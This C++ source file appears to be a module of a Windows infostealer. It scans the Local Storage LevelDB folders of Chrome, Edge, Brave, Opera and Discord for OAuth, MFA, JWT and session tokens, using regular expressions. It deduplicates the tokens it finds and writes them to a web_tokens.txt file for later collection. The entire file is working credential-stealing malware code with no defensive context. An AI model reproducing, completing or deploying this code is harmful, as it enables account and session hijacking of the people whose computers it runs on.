#include "tokens_web.h"
#include "utils.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <regex>
#include <vector>
#include <string>

const std::vector<std::string> local_storage_paths = {
    R"(Google\Chrome\User Data\Default\Local Storage\leveldb)",
    R"(Microsoft\Edge\User Data\Default\Local Storage\leveldb)",
    R"(BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb)",
    R"(Opera Software\Opera Stable\Local Storage\leveldb)",
    R"(Discord\Local Storage\leveldb)",
    R"(discordcanary\Local Storage\leveldb)",
    R"(discordptb\Local Storage\leveldb)"
};

//regular expressions for common web tokens
const std::regex oauth_token_regex(R"(([\w-]{24}\.[\w-]{6}\.[\w-]{27}))");
const std::regex mfa_token_regex(R"(mfa\.[\w-]{84})");
const std::regex jwt_regex(R"([A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+)");
const std::regex session_id_regex(R"(session_id=[A-Za-z0-9-_]+)");

static std::string read_file_to_string(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return "";

    std::string contents((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
    return contents;
}

static std::vector<std::string> extract_tokens(const std::string& data) {
    std::vector<std::string> tokens;
    std::smatch match;

    auto search_start = data.cbegin();

    while (std::regex_search(search_start, data.cend(), match, oauth_token_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    search_start = data.cbegin();
    while (std::regex_search(search_start, data.cend(), match, mfa_token_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    search_start = data.cbegin();
    while (std::regex_search(search_start, data.cend(), match, jwt_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    //extract session_id
    search_start = data.cbegin();
    while (std::regex_search(search_start, data.cend(), match, session_id_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    return tokens;
}

//remove duplicate tokens
//its really not? i not need no explain all
static std::vector<std::string> unique_tokens(const std::vector<std::string>& tokens) {
    std::vector<std::string> uniqueList;
    for (const auto& t : tokens) {
        if (std::find(uniqueList.begin(), uniqueList.end(), t) == uniqueList.end()) {
            uniqueList.push_back(t);
        }
    }
    return uniqueList;
}

//get absolute paths from LevelDB to Local Storage
static std::vector<std::string> get_local_storage_paths() {
    std::vector<std::string> full_paths;

    char localappdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localappdata))) {
        std::string localApp(localappdata);
        for (const auto& rel : local_storage_paths) {
            full_paths.push_back(localApp + "\\" + rel);
        }
    }

    return full_paths;
}

//extract tokens from a LevelDB folder
static std::vector<std::string> extract_tokens_from_folder(const std::string& folder) {
    std::vector<std::string> found_tokens;

    if (!std::filesystem::exists(folder)) return found_tokens;

    for (const auto& entry : std::filesystem::directory_iterator(folder)) {
        if (!entry.is_regular_file()) continue;

        std::string ext = entry.path().extension().string();
        if (ext != ".log" && ext != ".ldb" && ext != ".txt") continue;

        std::string content = read_file_to_string(entry.path().string());
        if (content.empty()) continue;

        auto tokens = extract_tokens(content);
        found_tokens.insert(found_tokens.end(), tokens.begin(), tokens.end());
    }

    return unique_tokens(found_tokens);
}

//save the fucking tokens to a file in outputFolder
static void save_tokens_to_file(const std::vector<std::string>& tokens, const std::string& outputFolder) {
    if (tokens.empty()) return;

    std::string filepath = outputFolder + "web_tokens.txt";
    std::ofstream ofs(filepath, std::ios::app);

    for (const auto& token : tokens) {
        ofs << token << "\n";
    }

    ofs.close();
}

void dump_web_tokens(const std::string& outputFolder) {
    std::vector<std::string> all_tokens;

    auto folders = get_local_storage_paths();

    for (const auto& folder : folders) {
        auto tokens = extract_tokens_from_folder(folder);
        all_tokens.insert(all_tokens.end(), tokens.begin(), tokens.end());
    }

    all_tokens = unique_tokens(all_tokens);

    save_tokens_to_file(all_tokens, outputFolder);
}
